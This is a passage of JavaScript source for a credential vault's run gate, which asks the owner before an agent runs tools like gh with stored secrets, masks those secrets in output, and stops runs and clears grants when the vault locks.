        if (callerRuns(caller.conversationId) >= RUNS_PER_CALLER || runs.size >= RUNS_MAX) return named('too_many_runs');
        const shown = detailOf(spec, shape, place, { facts: entries, why: verdict.why || [], away: verdict.away || [] });   // lane vault-agent-own: + who stored each entry, why it asks
        if (shown.length > DETAIL_MAX) return named('card_too_long');
        // lane vault-agent-own r20 (the owner «这个卡片的可读性很差»): the SAME run as STRUCTURED FACTS (codes, never prose) the client renders in the viewer's language — rides the ask record beside `detail`; `detail` stays byte-unchanged for older clients
        const facts = VR.cardFactsOf(spec, shape, place, { who: String(caller.name || caller.sessionKey || caller.conversationId).slice(0, 80), home, cmd: head.cmd, entries: nameById });
        const a = await ask({ caller, run: spec, shape, key, detail: shown, facts, signal, always: verdict.offers.includes('always') });
        asked = a.outcome; askId = a.askId;
        if (asked === 'pending') { note('ask_pending', { ...head, askId }); return named('ask_pending'); }
        const outcome = { gone: 'caller_gone', unfiled: 'ask_unfiled', denied: 'ask_denied', expired: 'ask_expired', changed: 'ask_changed', vault_locked: 'vault_locked' }[asked];
        if (outcome) { note(outcome, { ...head, askId }); return named(outcome); }
        // allowed / always — the verdict AGAIN over the facts as they stand NOW (a lock, a switch closed while the card waited)
        const answered = (verdict.away || []).map((x) => ({ id: x.id, host: x.pass }));   // THIS 允许 — for this run, whatever is kept
        for (const x of verdict.away || []) if (x.keep) hostPasses.set(`${scope}\n${x.id}\n${x.pass}`, { scope, id: x.id, host: x.pass, at: now() });   // lane vault-agent-own: ONCE per host (or, on a local instance, where the destination cannot be told, per command shape) — the 允许 is that pass for that entry; a cluster keeps no shape pass (round 2)
        const d2 = load();
        const again = spec.refs.map((r) => { const row = rowOf(r), e0 = entries.find((e) => e.id === r.id); return { ...e0, exists: !!row, open: !!(row && ((d2 && d2.runnable.has(r.id)) || grantOf(scope, r.id))) }; });
        verdict = VR.runVerdict({ state: vaultState(), plan: spec, shape, entries: again, granted, remembered: { until: null }, seen: true, instance: instanceKind(), policy: 'allow', passes: [...passes(), ...answered], now: now() });
        if (verdict.ok) verdict = { ok: true, by: asked === 'always' ? 'always' : 'once' };
      }
      if (!verdict.ok) { if (verdict.code === 'vault_locked') { try { vault.blocked(VB.actorName(caller.name, 'a conversation'), 'vibespace-vault run'); } catch { } } note(verdict.code, { ...head, askId }); return verdict; }
      if (signal && signal.aborted) { note('caller_gone', head); return named('caller_gone'); }
      if (callerRuns(caller.conversationId) >= RUNS_PER_CALLER || runs.size >= RUNS_MAX) return named('too_many_runs');
      // A ONCE-GRANT IS SPENT BEFORE THE RUN (a grant never runs twice): still the very row the verdict read — a lock, the switch
      // or another run of this conversation took it meanwhile ⇒ nothing runs
      const spent = [];
      for (const a of admitted) {
        if (grants.get(a.pair) !== a.g || !(a.g.until > now())) { note('use_not_granted', head); return named('use_not_granted'); }
        if (a.g.once) spent.push(a);
      }
      for (const a of spent) grants.delete(a.pair);
      // L3 (int331) + round 14: a once-grant is spent only when a child RAN — restore it when nothing ran (entry_unknown / too-short
      // / spawn_failed), but NEVER across a lock (the epoch moved, or the vault is no longer unlocked): a lock ends every grant
      // (vault_locked is not in BURNED; onLocked cleared them), so restoreOnce must not bring a spent once-grant back after one.
      const BURNED = new Set(['entry_unknown', 'entry_too_short_to_mask', 'spawn_failed', 'run_path_unsafe', 'git_not_on_seal', 'tool_not_sealed']);
      const restoreOnce = (r) => { if (lockGen === lg0 && vaultState() === 'unlocked' && r && r.ok === false && BURNED.has(r.code)) for (const a of spent) if (a.g.until > now()) grants.set(a.pair, a.g); return r; };
      if (sealedTool && toolFd != null && !toolSealed(spec.tool, toolFd)) { note('tool_not_sealed', { ...head, tool: toolName, why: 'ownership changed between the hash and the spawn' }); return restoreOnce(named('tool_not_sealed', { tool: toolName, words: "the tool's ownership changed between the hub's check and the run — a root-owned program became writable before it could start, so it was not run; nothing ran" })); }   // round 15: tool_changed's one remaining case — a sealed tool whose fstat ownership moved before the exec; round 16 (MINOR): a refusal AFTER the spend restores the once-grant (nothing ran), and the words say THIS path's cause
      fdHandedOff = true;
      const out = spawnRun({ caller, spec, shape, head, verdict, askId, place, base, signal, t0, note, receipt: runReceipt, toolFd, closeTool, toolName });
      return out && typeof out.then === 'function' ? out.then(restoreOnce) : restoreOnce(out);
    } finally {
      if (!fdHandedOff) closeTool();   // round 14: an early return before the hand-off releases the open tool fd
    }
  }

  async function spawnRun({ caller, spec, head, verdict, askId, place, base, signal, t0, note, receipt, toolFd, closeTool, toolName }) {
    // round 11: the sealed env is built HERE, at the spawn. The PATH is the set of root-owned realpaths computed ONCE at boot; if a
    // runSeal tool has no safe system dir to run from (a root hub, or git only under a writable prefix) the run is refused BY NAME.
    // round 14 (MAJOR): the SEAL's host comes ONLY from gh's ROUTING inputs — -R/--repo, --hostname, GH_HOST, a spec positional's
    // host (shape.routeHosts) — never a URL in a body / title / template / env value (those are the CARD's words, shape.hosts; r13
    // read head.hosts and so followed a link in an issue BODY to that host). The host the command ROUTED to (the verdict approved
    // it) wins over the mint's --for, BOTH directions: a value minted --for a GHES host used against github.com homes to GH_TOKEN +
    // GH_HOST=github.com, and a github-minted value used against a named GHES host homes to GH_ENTERPRISE_TOKEN + that host.
    const sealHost = (() => {
      if (!spec.row || !spec.row.runSeal || !spec.row.runSeal.hostEnv) return null;
      const route = [...new Set((head.routeHosts || []).filter(Boolean))];
      if (route.length === 1) return route[0];
      if (route.length > 1) return null;   // more than one routing host named: no single pin
      const mint = [...new Set(spec.refs.map((r) => { const rw = rowOf(r); const pv = (rw && rw.provenance) || {}; return pv.prov === 'minted' ? VR.forHostOf(pv.forHost) : null; }).filter(Boolean))];
      return mint.length === 1 ? mint[0] : null;
    })();
    const sealEnv = sealEnvFor(spec.row, base, sealHost);
    if (spec.row && spec.row.runSeal && !sealEnv.PATH) { closeTool(); note('run_path_unsafe', { ...head }); return named('run_path_unsafe'); }
    // round 14 (MINOR, the r11 "git not found ⇒ re-check"): gh spawns `git` as a child; if git is not on the sealed (root-owned)
    // PATH the run would silently fail — gitOnSeal is resolved ONCE at boot over the same sealed PATH; refuse BY NAME here.
    // round 13/14: the tool was opened, SEALED-checked and hashed in run() (the digest FIRST). spawnRun exec's the SAME inode via
    // /proc/<pid>/fd (toolFd, held from the hash), or by path where /proc is absent (a sealed root-owned inode is unswappable). The
    // held fd is closed in finish() with the run.
    // THE VALUES — read now, held in this closure only for the spawn and the scrubbers; never stored, never logged
    let values = new Map();
    for (const r of spec.refs) {
      let v = null;
      try { v = valueOf(r); } catch (e) { note('entry_unknown', { ...head, ref: r.ref, why: String((e && e.code) || 'unreadable').slice(0, 60) }); closeTool(); return named('entry_unknown', { ref: r.ref }); }
      if (v == null) { note('entry_unknown', { ...head, ref: r.ref }); closeTool(); return named('entry_unknown', { ref: r.ref }); }
      if (Buffer.byteLength(v, 'utf8') < VR.MIN_MASK_BYTES) { note('entry_too_short_to_mask', { ...head, ref: r.ref }); closeTool(); return named('entry_too_short_to_mask', { ref: r.ref }); }
      values.set(r.ref, v);
    }
    const secrets = spec.refs.map((r) => ({ ref: r, value: values.get(r.ref) }));
    let scrub;
    try { scrub = VR.createRunMasker(secrets, ['out', 'err']); }   // ONE per run, both pipes in arrival order (one window); BEFORE any file holds a value (the review: a throw here leaked the folder)
    catch (e) { values = null; note('spawn_failed', { ...head, why: `the scrubber (${(e && e.code) || 'error'})` }); closeTool(); return named('spawn_failed', { why: 'the scrubber could not be built' }); }
    let dir = null;
    try {
      dir = fs.mkdtempSync(path.join(runRoot(), RUN_DIR_PREFIX)); fs.chmodSync(dir, 0o700);
      const ofd = fs.openSync(path.join(dir, OWNER_FILE), fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_EXCL | (fs.constants.O_NOFOLLOW || 0), 0o600);
      try { fs.writeSync(ofd, JSON.stringify(hubIdentity || { pid: process.pid })); } finally { fs.closeSync(ofd); }
    } catch (e) { if (dir) shredDir(dir); values = null; note('spawn_failed', { ...head, why: `the run directory (${e.code || e.message})` }); closeTool(); return named('spawn_failed', { why: 'the run directory could not be made' }); }
    const mark = path.basename(dir);
    const m = VR.materialize(spec, { valueOf: (ref) => values.get(ref), pathOf: (slot) => path.join(dir, `f${slot}`) });
    try {
      for (const f of m.files) {
        const fd = fs.openSync(f.path, fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_EXCL | (fs.constants.O_NOFOLLOW || 0), 0o600);
        try { fs.writeSync(fd, f.content); } finally { fs.closeSync(fd); }
      }
    } catch (e) { shredDir(dir); values = null; note('spawn_failed', { ...head, why: `a run file (${e.code || e.message})` }); closeTool(); return named('spawn_failed', { why: 'a run file could not be written' }); }
    return new Promise((resolve) => {
      const rec = { conv: caller.conversationId, name: caller.name || null, child: null, stopped: null, hard: null, timer: null, dir, mark, piped: false };
      const dec = { out: new StringDecoder('utf8'), err: new StringDecoder('utf8') };
      const parts = { out: [], err: [] };
      const handOn = (o) => { parts.out.push(o.out); parts.err.push(o.err); };   // what the run's scrubber hands on, each to the stream it came on
      let got = 0, truncated = false, done = false, spawnError = null;
      const take = (k, buf) => {
        if (truncated) return;
        let b = buf;
        if (got + b.length > VR.OUTPUT_MAX_BYTES) { b = b.subarray(0, VR.OUTPUT_MAX_BYTES - got); truncated = true; }
        got += b.length;
        const text = dec[k].write(b);
        if (text) handOn(scrub.push(k, text));
      };
      const finish = (code, sig) => {
        if (done) return;
        done = true;
        closeTool();   // round 13: the open tool fd (held from the hash through the exec) is released with the run
        runs.delete(rec);
        try { timers.clear(rec.timer); } catch { }
        try { timers.clear(rec.hard); } catch { }
        // THE RUN ENDS WHOLE: its group's leftovers (a backgrounded `cmd &`) and every process still carrying its mark (setsid,
        // a double fork) hold the value in their environ — they end with it (the review: they outlived a lock)
        killGroup(rec, 'SIGKILL');
        const strays = endMarked(mark);
        shredDir(dir);
        // A CUT STREAM (the 2 MiB bound, a timeout, a lock, the caller gone) keeps its held tail BACK for good: a value that
        // began in the last (longest form − 1) characters may be only half there — flushed, its half would pass unscrubbed
        const cut = truncated || !!rec.stopped || rec.piped;   // + the pipes cut 2 s after the child's exit (the review)
        for (const k of ['out', 'err']) handOn(scrub.push(k, dec[k].end()));
        if (!cut) handOn(scrub.end());
        values = null;
        const ms = now() - t0;
        const outT = redactLong(parts.out.join('')), errT = redactLong(parts.err.join(''));
        const scrubbed = { hits: scrub.hits, bytes: scrub.bytes, byForm: Object.fromEntries(VR.FORMS.map((f) => [f, scrub.byForm[f] || 0]).filter(([, n]) => n)) };
        // the run's RECEIPT (minted at the run's start): the agent's answer, its audit line and each entry's use line carry the same one (design D1: a use + a receipt)
        const line = { ...head, receipt, allowedBy: verdict.by, askId, exit: Number.isInteger(code) ? code : null, signal: sig || null, ms, timedOut: rec.stopped === 'timeout', truncated, tailDropped: cut, strays, scrubbed, redacted: outT.redacted + errT.redacted, stdout: utf8Head(outT.text), stderr: utf8Head(errT.text) };
        if (spawnError) { const { receipt: _r, ...noRun } = line; note('spawn_failed', { ...noRun, why: spawnError }); resolve(named('spawn_failed', { why: spawnError })); return; }   // no child ran: no receipt, no use
        if (rec.stopped === 'lock') { note('vault_locked', { ...line, killed: true }); try { vault.blocked(VB.actorName(caller.name, 'a conversation'), 'vibespace-vault run'); } catch { } resolve(named('vault_locked', { killed: true })); return; }
        if (rec.stopped === 'gone') { note('caller_gone', { ...line, killed: true }); resolve(named('caller_gone')); return; }
        note('ran', line);
        resolve({ ok: true, exit: line.exit, signal: line.signal, timedOut: line.timedOut, truncated, ms, stdout: outT.text, stderr: errT.text, scrubbed: { hits: scrubbed.hits, bytes: scrubbed.bytes }, redacted: line.redacted, by: verdict.by, shapeId: head.shapeId, receipt });
      };
      let child;
      try {
        // round 12 (MINOR): home the credential to the run's host — the agent passed it as a GH_TOKEN reference (runSeal.credRef);
        // the DOOR sets the env NAME gh honours for the pinned host (GH_TOKEN for github.com / *.ghe.com, GH_ENTERPRISE_TOKEN for a
        // GHES host) and clears the other, so a value minted --for a GHES host reaches gh and the agent names neither name.
        const credHome = (() => { const rs = spec.row && spec.row.runSeal; if (!rs || !rs.credRef || !sealHost) return {}; const ref = rs.credRef, name = VR.ghCredEnvFor(sealHost, spec.row), val = m.env[ref]; return (name && name !== ref && val !== undefined) ? { [name]: val, [ref]: undefined } : {}; })();
        const execPath = toolFd != null ? ('/proc/' + process.pid + '/fd/' + toolFd) : spec.tool;   // round 13: exec the open inode we hashed, never a second path lookup
        const argv0 = toolFd != null ? spec.tool : m.argv[0];   // the child's argv[0] = the tool's real path (gh reads it only for help text)
        child = spawnImpl(execPath, m.argv.slice(1), { argv0, cwd: place, env: { ...base, ...m.env, ...sealEnv, ...credHome, [MARK_ENV]: mark }, stdio: [m.stdin != null ? 'pipe' : 'ignore', 'pipe', 'pipe'], detached: true, windowsHide: true });
      } catch (e) { spawnError = String((e && e.code) || (e && e.message) || 'spawn').slice(0, 80); finish(null, null); return; }
      rec.child = child;
      runs.add(rec);
      child.on('error', (e) => { spawnError = String((e && e.code) || (e && e.message) || 'spawn').slice(0, 80); if (!child.pid) finish(null, null); });
      if (child.stdout) child.stdout.on('data', (b) => take('out', b));
      if (child.stderr) child.stderr.on('data', (b) => take('err', b));
      if (m.stdin != null && child.stdin) { child.stdin.on('error', () => { }); child.stdin.end(m.stdin); }
      child.on('close', (code, sig) => finish(code, sig));
      // a grandchild that left the group and holds the pipes open never holds the answer: PIPE_GRACE_MS after the child's exit, the pipes are cut
      child.on('exit', (code, sig) => { const t = timers.set(() => { if (done) return; rec.piped = true; try { child.stdout && child.stdout.destroy(); child.stderr && child.stderr.destroy(); } catch { } finish(code, sig); }, pipeGraceMs); t?.unref?.(); });
      rec.timer = timers.set(() => stop(rec, 'timeout'), spec.timeoutSec * 1000);
      rec.timer?.unref?.();
      if (signal && typeof signal.addEventListener === 'function') { if (signal.aborted) stop(rec, 'gone'); else signal.addEventListener('abort', () => stop(rec, 'gone'), { once: true }); }
    });
  }

  // THE LOCK (decision ③): every running child ends BY NAME, every card settles, the seen shapes and the 8-hour «always» go
  function onLocked(why = 'lock') {
    for (const rec of [...runs]) { log(`the vault locked (${why}): stopping the run of ${rec.name || rec.conv}`); stop(rec, 'lock'); shredDir(rec.dir); }   // its files go AT ONCE (the child is being stopped)
    for (const q of [...asks.values()]) settle(q, 'vault_locked', 'locked');
    asking.batch = true;   // B-4934: one recount after the whole withdrawal, not one per request
    try { for (const q of [...requests.values()]) settleRequest(q, 'vault_locked', 'locked'); } finally { asking.batch = false; }   // lane vault-manual-and-lock: every open request is withdrawn
    askingLine();
    lockGen++;   // round 14: the lock epoch moves — restoreOnce never brings a spent once-grant back across it
    for (const lq of [...lateAsks.values()]) removeLate(lq, 'vault_locked', 'vault');   // lane vault-agent-own r20b: an open late card settles vault_locked, its pass ends
    lateOnce.clear();
    seen.clear(); shortAlways.clear(); grants.clear(); hostPasses.clear(); db = null; dbEpoch = -1;   // … and every grant ends (once / 8 hours) — and every host pass (lane vault-agent-own)
  }
  if (typeof vault.onLock === 'function') vault.onLock((why) => onLocked(why));

  /** Boot: a run directory a previous process left (it died with its child) — shredded. → how many. */
  function sweep() {
    let n = 0, names = [];
    const root = runRoot();
    try { names = fs.readdirSync(root); } catch { return 0; }
    for (const e of names) {
      if (!e.startsWith(RUN_DIR_PREFIX)) continue;
      const p = path.join(root, e);
      let st = null; try { st = fs.lstatSync(p); } catch { continue; }
      if (!st.isDirectory() || (typeof process.getuid === 'function' && st.uid !== process.getuid())) continue;
      let owner = null; try { owner = JSON.parse(readBounded(path.join(p, OWNER_FILE), 4096).toString('utf8')); } catch { owner = null; }
      if (owner && Number(owner.pid) === process.pid) continue;   // this hub's own run
      if (owner && PI.aliveIdentity(owner) !== false) continue;   // ANOTHER hub that lives (or one that cannot be proven gone): its runs are its own (the review)
      endMarked(e);   // the children that outlived their hub end first — then the files
      shredDir(p); n++;
    }
    return n;
  }
  /** The process ends: every child, its strays and its files with it (sync — an exit handler). */
  function closeAll() { for (const rec of [...runs]) { killGroup(rec, 'SIGKILL'); endMarked(rec.mark); shredDir(rec.dir); } runs.clear(); }

  // round 14 (MINOR): the sealed PATH and whether `git` lives on it are computed ONCE at the door's construction (a boot step,
  // bounded — the boot law < 250 ms), never on the event loop at the first spawn (r11 fixup 1; r13's lazy memo did it at spawn #1).
  try { const t = Date.now(); const sealed = sealedPathOf(agentEnv()); sealedDirs = sealed.split(':').filter(Boolean); gitOnSeal = probeGit(sealedDirs); bootSealMs = Date.now() - t; log(`vault-run-door: sealed PATH computed at boot in ${bootSealMs} ms (git on seal: ${gitOnSeal})`); } catch (e) { log(`vault-run-door: boot seal failed (${(e && e.message) || e})`); }

  return { run, answer, setRunnable, rowFacts, runnableFor, reconcile, sweep, closeAll, onLocked, request, answerRequest, usesFor, grantPasted, _bootSeal: () => ({ ms: bootSealMs, gitOnSeal }),
    listRequests: () => [...requests.values()].map((q) => ({ askId: q.askId, who: q.who, ref: q.ref, askedAt: q.askedAt })), _grants: grants, _requests: requests, _reqQuiet: reqQuiet,
    listAsks: () => [...asks.values()].map((q) => ({ askId: q.askId, who: q.who, always: q.always, askedAt: q.askedAt, expiresAt: q.askedAt + VR.ASK_TTL_MS })), running: () => runs.size, ACTION_TYPE, _asks: asks, _seen: seen, _lateAsks: lateAsks, _lateOnce: lateOnce };
}

const statusOf = (code) => STATUS[code] || 400;
module.exports = { create, classOf, statusOf, STATUS, MORE_WORDS, ACTION_TYPE, REQUEST_TYPE, GRANT_MS, GRANT_ANSWERS, PURPOSE_MAX, REQUESTS_PER_CALLER, REQUEST_CALLERS_MAX, ASKING_LINE_OVER, ASKING_TEXT, ASKING_KEY, STORE_FILE, MARK_LABEL, RUN_DIR_PREFIX, OWNER_FILE, MARK_ENV, SEAL_NOWHERE, rootOwnedNoWrite, sha256File, sha256Fd, sealDirReal, sealedToolReal, ARGS_MAX, CWD_MAX, readBounded, endMarked, KILL_GRACE_MS, HEAD_MAX, DETAIL_MAX, LATE_TTL_MS, NO_ALWAYS, RUN_CLASS, NEVER_CLASS, redactLong };
